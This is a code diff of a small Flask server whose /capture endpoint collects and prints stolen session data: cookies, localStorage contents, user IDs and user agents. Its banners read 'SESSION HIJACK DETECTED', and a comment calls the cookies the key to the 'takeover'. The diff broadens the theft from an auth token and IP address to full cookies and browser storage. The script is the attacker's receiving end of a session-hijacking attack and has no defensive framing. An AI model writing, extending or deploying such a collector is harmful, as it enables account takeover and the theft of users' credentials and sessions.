@@ -4,27 +4,26 @@ import datetime
 app = Flask(__name__)
 
 @app.route('/capture', methods=['POST'])
-def capture_session():
+def capture():
     data = request.json
     
-    # In a real attack, we are looking for:
-    # 1. The Session ID (Cookie)
-    # 2. The Auth Token (Bearer Token)
-    # 3. The User's Login Credentials
+    if not data:
+        return jsonify({"error": "No data"}), 400
+
+    print("\n" + "!"*50)
+    print(f"[*] [!!!] SESSION HIJACK DETECTED [!!!] [*]")
+    print(f"[*] TIME: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print(f"[*] TARGET USER: {data.get('user_id')}")
+    print(f"[*] USER AGENT: {data.get('userAgent')}")
+    print("-" * 50)
     
-    auth_token = data.get('auth_token')
-    user_id = data.get('user_id')
-    ip_address = request.remote_addr
+    # The most important part for the takeover
+    print(f"[COOKIES]: {data.get('cookies')}")
+    print(f"[LOCAL STORAGE]: {data.get('localStorage')}")
+    print("-" * 50)
+    print("!"*50 + "\n")
 
-    print("\n" + "!"*40)
-    print(f"[*] CRITICAL: SESSION DATA INTERCEPTED")
-    print(f"[*] TIMESTAMP: {datetime.datetime.now()}")
-    print(f"[*] TARGET USER: {user_id}")
-    print(f"[*] IP ADDRESS: {ip_address}")
-    print(f"[*] AUTH TOKEN: {auth_token}")
-    print("!"*40 + "\n")
-
-    return jsonify({"status": "intercepted"}), 200
+    return jsonify({"status": "captured"}), 200
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080)
